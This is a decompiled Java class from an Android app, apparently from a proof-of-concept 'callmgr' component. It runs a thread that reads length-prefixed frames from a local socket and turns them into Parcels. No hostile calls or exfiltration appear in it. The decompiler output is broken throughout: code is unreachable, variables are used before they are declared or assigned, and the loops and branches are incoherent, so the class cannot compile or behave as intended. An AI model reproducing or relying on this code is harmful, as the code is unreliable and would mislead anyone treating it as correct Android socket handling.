package com.fx.socket;

import android.net.LocalSocket;
import android.os.Parcel;
import com.vvt.h.a;
import java.io.IOException;
import java.io.InputStream;

public abstract class e
  extends Thread
{
  private static final boolean a = a.b;
  private static final boolean b = a.e;
  private int c;
  private LocalSocket d;
  
  public e(LocalSocket paramLocalSocket)
  {
    this(paramLocalSocket, 8192);
  }
  
  public e(LocalSocket paramLocalSocket, int paramInt)
  {
    this.d = paramLocalSocket;
    int i = 8;
    if (paramInt > i) {}
    for (this.c = paramInt;; this.c = i)
    {
      return;
      i = 8192;
    }
  }
  
  private int a(InputStream paramInputStream, byte[] paramArrayOfByte)
  {
    int i = 0;
    int j = -1;
    int k = 4;
    int m = 0;
    int i3;
    int n;
    if (k > 0)
    {
      i3 = paramInputStream.read(paramArrayOfByte, m, k);
      if (i3 < 0)
      {
        n = b;
        if (n == 0) {}
      }
    }
    for (;;)
    {
      return j;
      int i4 = n + i3;
      k -= i3;
      n = i4;
      break;
      k = (paramArrayOfByte[0] & 0xFF) << 24;
      i = (paramArrayOfByte[1] & 0xFF) << 16;
      k |= i;
      i = (paramArrayOfByte[2] & 0xFF) << 8;
      k |= i;
      i = paramArrayOfByte[3] & 0xFF;
      k |= i;
      i = n;
      n = k;
      for (;;)
      {
        if (n <= 0) {
          break label191;
        }
        i4 = paramInputStream.read(paramArrayOfByte, i, n);
        int i1;
        if (i4 < 0)
        {
          i1 = a;
          if (i1 != 0) {}
          i1 = a;
          if (i1 == 0) {
            break;
          }
          break;
        }
        i += i4;
        int i2;
        i1 -= i4;
      }
      label191:
      j = k + 4;
    }
  }
  
  protected void a()
  {
    boolean bool = a;
    if (bool) {}
  }
  
  protected abstract void a(Parcel paramParcel);
  
  protected void a(Exception paramException)
  {
    boolean bool = b;
    if (bool) {}
  }
  
  public void run()
  {
    localObject1 = null;
    label50:
    do
    {
      try
      {
        localObject2 = this.d;
        localObject1 = ((LocalSocket)localObject2).getInputStream();
        if (localObject1 != null) {
          break label50;
        }
        boolean bool = b;
        if (bool) {}
        return;
      }
      catch (IOException localIOException3)
      {
        try
        {
          for (;;)
          {
            Parcel localParcel;
            int j;
            int i;
            ((InputStream)localObject1).close();
            Object localObject2 = this.d;
            if (localObject2 != null) {}
            try
            {
              localObject2 = this.d;
              ((LocalSocket)localObject2).close();
            }
            catch (IOException localIOException5)
            {
              for (;;) {}
            }
            a();
          }
          localIOException3 = localIOException3;
          if (localObject1 == null) {
            break label114;
          }
        }
        catch (IOException localIOException4)
        {
          try
          {
            for (;;)
            {
              ((InputStream)localObject1).close();
              localObject1 = this.d;
              if (localObject1 != null) {}
              try
              {
                localObject1 = this.d;
                ((LocalSocket)localObject1).close();
              }
              catch (IOException localIOException2)
              {
                for (;;) {}
              }
              a(localIOException3);
            }
            localIOException4 = localIOException4;
          }
          catch (IOException localIOException1)
          {
            for (;;) {}
          }
        }
      }
      localParcel = Parcel.obtain();
      localParcel.unmarshall((byte[])localObject2, 0, j);
      a(localParcel);
      localParcel.recycle();
      i = this.c;
      localObject2 = new byte[i];
      j = a((InputStream)localObject1, (byte[])localObject2);
    } while (j >= 0);
    if (localObject1 == null) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/fx/socket/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */